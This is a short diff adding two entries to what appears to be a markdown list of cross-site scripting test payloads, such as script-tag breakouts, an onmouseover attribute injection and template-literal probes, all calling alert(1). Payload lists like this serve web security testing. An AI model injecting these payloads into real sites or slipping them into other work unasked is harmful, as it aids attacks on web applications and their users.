@@ -6,6 +6,8 @@
 "onmouseover="alert(1)
 </script><script>alert(1)</script>
 \'-alert(1)//
+http://foo?&apos;-alert(1)-&apos;
+${alert(1)}
 ``` 
 
 ## DOM Payloads:
